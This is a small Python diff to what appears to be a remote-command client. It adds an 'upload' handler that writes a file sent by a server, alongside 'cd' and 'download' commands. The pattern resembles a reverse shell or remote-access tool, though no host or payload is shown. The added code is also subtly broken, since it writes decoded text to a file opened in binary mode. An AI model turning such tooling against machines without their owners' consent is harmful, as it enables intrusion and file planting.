@@ -24,8 +24,21 @@ def main():
 			elif cmd.find('cd', 0 , 2) != -1 :
 				comp = cmd.split()
 				comm.change_dir(comp[1])
+				print(comp[1])
 				data = comp[1]
 			elif cmd.find('upload', 0 , 6) != -1:
+				comp = cmd.split()
+				print(comp[1])
+				fs = filestream(comp[1], 'wb+')
+				while True:
+					data = con.recv_serv()
+					if data.rfind(deli.encode()) != -1 :
+						fs.write(data[:data.rfind(deli.encode())].decode())
+						break
+					fs.write(data.decode())
+					print(data)
+				fs.close()
+				del fs
 				print('uploading')
 				continue
 			elif cmd.find('download', 0 , 8) != -1:
